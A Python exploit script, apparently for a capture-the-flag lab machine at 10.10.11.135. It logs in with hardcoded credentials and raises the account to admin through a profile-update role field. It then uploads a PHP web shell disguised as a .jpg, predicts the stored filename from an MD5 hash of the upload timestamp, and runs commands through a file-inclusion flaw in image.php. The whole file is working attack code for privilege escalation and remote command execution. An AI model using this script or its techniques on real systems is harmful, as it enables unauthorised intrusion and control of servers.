import re
import calendar
import hashlib
import traceback
import requests as r
import json
from dateutil import parser
import tempfile
import argparse

s = r.session()
# s.proxies = {"http": "http://127.0.0.1:8080"}
url = "http://10.10.11.135"
arguparser = argparse.ArgumentParser(description='Run without any argument to uplaod a simple php web shell and request it with curl HTTP-POST request.')
arguparser.add_argument("--cmd", help="Direct comamnd execute. Default is php web shell.")
arguparser.add_argument("--file", help="Upload file form your filesystem. Default is simple php script with system function.")
arguparser.add_argument('-T', action='store_true', help="Enable traceback")
args = arguparser.parse_args()


def becomeAdmin():
    login_data = {"user": "aaron", "password": "aaron"}
    login_rspn = s.post(f"{url}/login.php?login=true", allow_redirects=True, data=login_data)
    check_login = re.findall(r'<h1 class="text-center" style="padding: 200px">(.*?)</h1>', login_rspn.text)[0]
    print("[+]", check_login)

    role_data = {"firstName": "test", "lastName": "test", "email": "test", "company": "test", "role": "1"}
    role_rspn = s.post(f"{url}/profile_update.php", data=role_data)
    print("[+] user role changed to: ", json.loads(role_rspn.text)["role"])


def uploadFile(cmd=None):
    becomeAdmin()
    # Generate temporary file with pyaload
    f = tempfile.NamedTemporaryFile(suffix=".jpg")
    if args.cmd:
        file_content = f"""<?php system('{cmd}'); ?>""".encode('UTF-8')
    else:
        file_content = "<?php system($_POST['cmd']); ?>".encode('UTF-8')
    f.write(file_content)
    f.seek(0)
    # print("[+] Name of the file is:", f.name.rsplit('/')[-1])

    # Upload file
    global input_file
    if args.file:
        if args.file.lower().endswith('.jpg'):
            input_file = args.file
        else:
            exit('[!] Only .jpg supported!')
    else:
        input_file = f.name
    with open(input_file, 'rb') as f:
        upload_rspn = s.post(f"{url}/upload.php", files={'fileToUpload': f})
    print("[+]", upload_rspn.text)

    # Create epoch timestamp of uploaded time
    print('[+] Upload time: ', upload_rspn.headers['date'])
    dt = parser.parse(upload_rspn.headers['date'])
    time_epoch = calendar.timegm(dt.utctimetuple())
    print('[+] epoch timestamp: ', time_epoch)

    # Create filename
    hash_part = '$file_hash' + str(time_epoch)
    file_name = hashlib.md5(hash_part.encode('utf-8')).hexdigest() + "_" + f.name.rsplit('/')[-1]
    f.close()
    print("[+] Uploaded file name:", file_name)
    if args.file:
        exit(print("[+] File location: ", f"{url}/image.php?img=images/uploads/{file_name}"))
    else:
        # Request uploaded file with lfi
        if args.cmd:
            check_file = s.post(f"{url}/image.php?img=images/uploads/{file_name}")  # php://filter/read=/resource=
            print("[+] Payload response -\n", check_file.text)
        else:
            print("[+] PHP HTTP-POST web shell uploaded:", f"curl \"{url}/image.php?img=images/uploads/{file_name}\" --data \"cmd=id\"")
            print("[+] Testing web shell -\n", s.post(f"{url}/image.php?img=images/uploads/{file_name}", data={"cmd": "id"}).text)


if __name__ == "__main__":
    try:
        if args.cmd and args.file:
            exit('[!] Both arguments not allowed at once!')
        elif args.cmd:
            uploadFile(args.cmd)
        elif args.file:
            uploadFile()
        else:
            uploadFile()
    except Exception as e:
        if args.T:
            print(traceback.format_exc())
        else:
            print(e)
    except KeyboardInterrupt as e:
        print('KeyboardInterrupt')


s.close()
